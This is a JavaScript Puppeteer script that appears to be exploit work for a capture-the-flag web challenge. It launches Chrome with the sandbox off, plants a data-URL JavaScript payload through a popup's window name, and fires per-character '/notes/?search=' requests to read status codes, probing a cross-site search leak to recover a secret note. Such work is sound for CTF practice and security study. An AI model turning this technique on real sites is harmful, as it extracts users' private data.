const puppeteer = require("puppeteer-core");

(async () => {
  const browser = await puppeteer.launch({
    headless: true,
    executablePath: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    args: ["--no-sandbox", "--disable-popup-blocking"],
  });
  const main = await browser.newPage();
  const stage = "http://e5ab60d8c5c85a6f.chal.ctf.ae/notes/aac08f1b";
  const code = `if(location.hash)Promise.all([..."0123456789abcdef"].map(x=>fetch('/notes/?search='+x))).then(a=>console.log('STATUSES',a.map(x=>x.status).join(',')))`;
  const moduleUrl = "data:text/javascript," + encodeURIComponent(code);
  const popupPromise = new Promise(resolve => main.once("popup", resolve));
  await main.setContent(`<script>open(${JSON.stringify(stage)},${JSON.stringify(moduleUrl)})</script>`);
  const popup = await popupPromise;
  popup.on("console", m => console.log("console", m.type(), m.text()));
  popup.on("pageerror", e => console.log("pageerror", e.message));
  await new Promise(resolve => setTimeout(resolve, 2000));
  for (const c of "0123456789abcdef") {
    const response = await popup.goto(`http://e5ab60d8c5c85a6f.chal.ctf.ae/notes/?search=${c}`, {waitUntil: "domcontentloaded"});
    console.log("nav", c, response.status());
  }
  await popup.goto(stage + "#probe", {waitUntil: "domcontentloaded"});
  await new Promise(resolve => setTimeout(resolve, 5000));
  await browser.close();
})();
